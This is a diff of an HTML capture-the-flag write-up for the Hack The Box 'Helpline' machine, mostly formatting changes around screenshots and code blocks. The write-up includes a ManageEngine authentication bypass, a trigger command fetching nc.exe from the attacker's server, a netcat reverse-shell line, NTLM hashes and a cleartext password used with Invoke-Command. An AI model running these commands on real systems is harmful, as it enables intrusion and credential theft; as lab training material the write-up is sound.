@@ -81,7 +81,7 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today Helpline retired and here’s my write-up about it. I really liked this box because It taught me some interesting stuff about Windows internals. The first shell I got on this box was as <code class="highlighter-rouge">nt authority/system</code> which means that I technically rooted the box. But the flags were <code class="highlighter-rouge">EFS</code> encrypted so I had to find a way to read them. It’s a Windows box and its ip is <code class="highlighter-rouge">10.10.10.152</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">helpline.htb</code>. Let’s jump right in !
-<img src="/images/hackthebox/helpline/0.png" alt=""></p>
+<br><img src="/images/hackthebox/helpline/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
@@ -200,70 +200,48 @@ session setup failed: NT_STATUS_LOGON_FAILURE
 
 <h2 id="http-initial-enumeration-administrative-access">HTTP Initial Enumeration, Administrative Access</h2>
 <p><br> On the <code class="highlighter-rouge">http</code> port there was an application called <code class="highlighter-rouge">ManageEngine ServiceDesk Plus</code>.
-<img src="/images/hackthebox/helpline/1.png" alt="">
+<br><img src="/images/hackthebox/helpline/1.png" alt=""><br>
 <br> I tried some common credentials like <code class="highlighter-rouge">admin:admin</code> and <code class="highlighter-rouge">guest:guest</code> which actually worked :
-<img src="/images/hackthebox/helpline/2.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/helpline/3.png" alt="">
+<br><img src="/images/hackthebox/helpline/2.png" alt=""><br>
+<br><img src="/images/hackthebox/helpline/3.png" alt=""><br>
 <br> But as <code class="highlighter-rouge">guest</code> my capabilities were limited so I had to elevate to an administrative user. I searched for known vulnerabilities for this application and found this <a href="https://www.exploit-db.com/exploits/42037" target="_blank" rel="noopener noreferrer">authentication bypass vulnerability</a>. However to exploit it I needed a valid username :
-<img src="/images/hackthebox/helpline/4.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/helpline/5.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/helpline/6.png" alt="">
+<br><img src="/images/hackthebox/helpline/4.png" alt=""><br>
+<br><img src="/images/hackthebox/helpline/5.png" alt=""><br>
+<br><img src="/images/hackthebox/helpline/6.png" alt=""><br>
 <br> luckily there was another <a href="https://www.exploit-db.com/exploits/35891" target="_blank" rel="noopener noreferrer">user enumeration vulnerability</a> which I could exploit as <code class="highlighter-rouge">guest</code>. 
-<img src="/images/hackthebox/helpline/7.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/helpline/8.png" alt="">
+<br><img src="/images/hackthebox/helpline/7.png" alt=""><br>
+<br><img src="/images/hackthebox/helpline/8.png" alt=""><br>
 <br> Before using <code class="highlighter-rouge">wfuzz</code> with a long wordlist I tried some common usernames first, <code class="highlighter-rouge">administrator</code> was an existing user :
-<img src="/images/hackthebox/helpline/9.png" alt="">
+<br><img src="/images/hackthebox/helpline/9.png" alt=""><br>
 <br> To exploit the authentication bypass vulnerability we have to login as <code class="highlighter-rouge">guest</code>, then navigate to <code class="highlighter-rouge">/mc</code> and logout. After that we will login as <code class="highlighter-rouge">administrator</code>  by using <code class="highlighter-rouge">administrator</code> as username and password then return to the index page again and we will be redirected to the dashboard as <code class="highlighter-rouge">administrator</code>.
-<img src="/images/hackthebox/helpline/10.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/helpline/11.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/helpline/12.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/helpline/13.gif" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/helpline/14.png" alt="">
+<br><img src="/images/hackthebox/helpline/10.png" alt=""><br>
+<br><img src="/images/hackthebox/helpline/11.png" alt=""><br>
+<br><img src="/images/hackthebox/helpline/12.png" alt=""><br>
+<br><img src="/images/hackthebox/helpline/13.gif" alt=""><br>
+<br><img src="/images/hackthebox/helpline/14.png" alt=""><br>
 <br> There is also a published <a href="https://www.exploit-db.com/exploits/46659" target="_blank" rel="noopener noreferrer">exploit</a> that does the same thing automatically :
-<img src="/images/hackthebox/helpline/15.png" alt=""></p>
+<br><img src="/images/hackthebox/helpline/15.png" alt=""><br></p>
 <hr>
 
 <h2 id="rce">RCE</h2>
 <p><br> I checked the <code class="highlighter-rouge">Admin</code> section and <code class="highlighter-rouge">Custom Triggers</code> under <code class="highlighter-rouge">Helpdesk Customizer</code> caught my attention.
-<img src="/images/hackthebox/helpline/16.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/helpline/17.png" alt="">
+<br><img src="/images/hackthebox/helpline/16.png" alt=""><br>
+<br><img src="/images/hackthebox/helpline/17.png" alt=""><br>
 <br> Description says : “You can define rules to automatically invoke any custom class or script file. The action rules can be applied to a request when it is created, (or received) or edited or both”
 <br> I ran a python <code class="highlighter-rouge">http</code> server to host <code class="highlighter-rouge">nc.exe</code> then I created a trigger that executes :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -command Invoke-WebRequest http://10.10.xx.xx/nc.exe -OutFile C:\Windows\System32\spool\drivers\color\nc.exe
 </code></pre></div></div>
 <p><br> When a request is created (it must has the word <code class="highlighter-rouge">test</code> in the subject).
-<img src="/images/hackthebox/helpline/18.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/helpline/19.png" alt="">
+<br><img src="/images/hackthebox/helpline/18.png" alt=""><br>
+<br><img src="/images/hackthebox/helpline/19.png" alt=""><br>
 <br> Last thing to do is to create a request that runs the trigger :
-<img src="/images/hackthebox/helpline/20.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/helpline/21.png" alt="">
+<br><img src="/images/hackthebox/helpline/20.png" alt=""><br>
+<br><img src="/images/hackthebox/helpline/21.png" alt=""><br>
 <br> I edited the trigger and made it execute :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.xx.xx 1337
 </code></pre></div></div>
 <p><br> Then I created another request and got a reverse shell as <code class="highlighter-rouge">nt authority\system</code> :
-<img src="/images/hackthebox/helpline/22.png" alt=""></p>
+<br><img src="/images/hackthebox/helpline/22.png" alt=""><br></p>
 <hr>
 
 <h2 id="encrypted-flags">Encrypted Flags</h2>
@@ -429,7 +407,7 @@ User : tolu
   Hash NTLM: 03e2ec7aa7e82e479be07ecd34f1603b
 </code></pre></div></div>
 <p><br> The only crackable hash was <code class="highlighter-rouge">zachary</code>’s :
-<img src="/images/hackthebox/helpline/23.png" alt="">
+<br><img src="/images/hackthebox/helpline/23.png" alt=""><br>
 <br> But what can we do with <code class="highlighter-rouge">zachary</code> ?</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\windows\system32\spool\drivers\color&gt; net users zachary
 net users zachary
@@ -524,9 +502,9 @@ Global Group memberships     *None
 The command completed successfully.
 </code></pre></div></div>
 <p><br> And <code class="highlighter-rouge">winrm</code>’s port is open :
-<img src="/images/hackthebox/helpline/24.png" alt="">
+<br><img src="/images/hackthebox/helpline/24.png" alt=""><br>
 <br> So I thought of authenticating as <code class="highlighter-rouge">tolu</code> to read the flag (I used <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">evilwinrm</code></a>)
-<img src="/images/hackthebox/helpline/25.png" alt="">
+<br><img src="/images/hackthebox/helpline/25.png" alt=""><br>
 <br> But I still couldn’t read the flag …</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\tolu\Desktop&gt; type user.txt
 Access to the path 'C:\Users\tolu\Desktop\user.txt' is denied.
@@ -813,20 +791,20 @@ writing RSA key
 root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 </code></pre></div></div>
 <p><br> And finally I imported it and I was able to read the flag :
-<img src="/images/hackthebox/helpline/26.png" alt="">
+<br><img src="/images/hackthebox/helpline/26.png" alt=""><br>
 <br> I found later that I could also use <code class="highlighter-rouge">Invoke-Command</code> as <code class="highlighter-rouge">tolu</code> and I would be able to read the flag, still don’t know why I couldn’t read it from a <code class="highlighter-rouge">winrm</code> session.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\System32\spool\drivers\color&gt; $username = "Helpline\tolu"
-$username = "Helpline\tolu"
-PS C:\Windows\System32\spool\drivers\color&gt; $password = "!zaq1234567890pl!99"
-$password = "!zaq1234567890pl!99"
-PS C:\Windows\System32\spool\drivers\color&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-PS C:\Windows\System32\spool\drivers\color&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
-$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
-PS C:\Windows\System32\spool\drivers\color&gt; Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock { type C:\Users\tolu\Desktop\user.txt }
-Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock { type C:\Users\tolu\Desktop\user.txt }
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\Windows\System32\spool\drivers\color&gt; <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"Helpline\tolu"</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"Helpline\tolu"</span>
+<span class="nb">PS </span>C:\Windows\System32\spool\drivers\color&gt; <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"!zaq1234567890pl!99"</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"!zaq1234567890pl!99"</span>
+<span class="nb">PS </span>C:\Windows\System32\spool\drivers\color&gt; <span class="nv">$securePassword</span> <span class="o">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> -AsPlainText -Force
+<span class="nv">$securePassword</span> <span class="o">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> -AsPlainText -Force
+<span class="nb">PS </span>C:\Windows\System32\spool\drivers\color&gt; <span class="nv">$credential</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Management.Automation.PSCredential <span class="nv">$username</span>, <span class="nv">$securePassword</span>
+<span class="nv">$credential</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Management.Automation.PSCredential <span class="nv">$username</span>, <span class="nv">$securePassword</span>
+<span class="nb">PS </span>C:\Windows\System32\spool\drivers\color&gt; Invoke-Command -ComputerName HELPLINE -Credential <span class="nv">$credential</span> -Authentication credssp -ScriptBlock <span class="o">{</span> <span class="nb">type </span>C:\Users\tolu\Desktop\user.txt <span class="o">}</span>
+Invoke-Command -ComputerName HELPLINE -Credential <span class="nv">$credential</span> -Authentication credssp -ScriptBlock <span class="o">{</span> <span class="nb">type </span>C:\Users\tolu\Desktop\user.txt <span class="o">}</span>
 </code></pre></div></div>
-<p><img src="/images/hackthebox/helpline/27.png" alt="">
+<p><br><img src="/images/hackthebox/helpline/27.png" alt=""><br>
 <br> We got user.
 <br></p>
 <hr>
@@ -912,21 +890,21 @@ type admin-pass.xml
 c:\Users\leo\Desktop&gt;
 </code></pre></div></div>
 <p><br> I used <code class="highlighter-rouge">Invoke-Command</code> again and used <code class="highlighter-rouge">Get-Content</code> to read <code class="highlighter-rouge">admin-pass.xml</code> instead of putting the password in a variable.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\Users\leo\Desktop&gt;powershell
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\Users\leo\Desktop&gt;powershell
 powershell
 Windows PowerShell 
-Copyright (C) Microsoft Corporation. All rights reserved.
+Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
 
-PS C:\Users\leo\Desktop&gt; $username = "Helpline\Administrator"
-$username = "Helpline\Administrator"
-PS C:\Users\leo\Desktop&gt; $password = "admin-pass.xml"
-$password = "admin-pass.xml"
-PS C:\Users\leo\Desktop&gt; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, (Get-Content $password | ConvertTo-SecureString)
-$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, (Get-Content $password | ConvertTo-SecureString)
-PS C:\Users\leo\Desktop&gt; Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock {type C:\Users\Administrator\Desktop\root.txt}
-Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock {type C:\Users\Administrator\Desktop\root.txt}
+<span class="nb">PS </span>C:\Users\leo\Desktop&gt; <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"Helpline\Administrator"</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"Helpline\Administrator"</span>
+<span class="nb">PS </span>C:\Users\leo\Desktop&gt; <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"admin-pass.xml"</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"admin-pass.xml"</span>
+<span class="nb">PS </span>C:\Users\leo\Desktop&gt; <span class="nv">$credential</span> <span class="o">=</span> <span class="nb">New-Object</span> -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="nv">$username</span>, <span class="o">(</span><span class="nb">Get-Content</span> <span class="nv">$password</span> | <span class="nb">ConvertTo-SecureString</span><span class="o">)</span>
+<span class="nv">$credential</span> <span class="o">=</span> <span class="nb">New-Object</span> -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="nv">$username</span>, <span class="o">(</span><span class="nb">Get-Content</span> <span class="nv">$password</span> | <span class="nb">ConvertTo-SecureString</span><span class="o">)</span>
+<span class="nb">PS </span>C:\Users\leo\Desktop&gt; Invoke-Command -ComputerName HELPLINE -Credential <span class="nv">$credential</span> -Authentication credssp -ScriptBlock <span class="o">{</span><span class="nb">type </span>C:\Users\Administrator\Desktop\root.txt<span class="o">}</span>
+Invoke-Command -ComputerName HELPLINE -Credential <span class="nv">$credential</span> -Authentication credssp -ScriptBlock <span class="o">{</span><span class="nb">type </span>C:\Users\Administrator\Desktop\root.txt<span class="o">}</span>
 </code></pre></div></div>
-<p><img src="/images/hackthebox/helpline/28.png" alt="">
+<p><br><img src="/images/hackthebox/helpline/28.png" alt=""><br>
 <br> We owned root !
 <br> That’s it , Feedback is appreciated !
 <br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
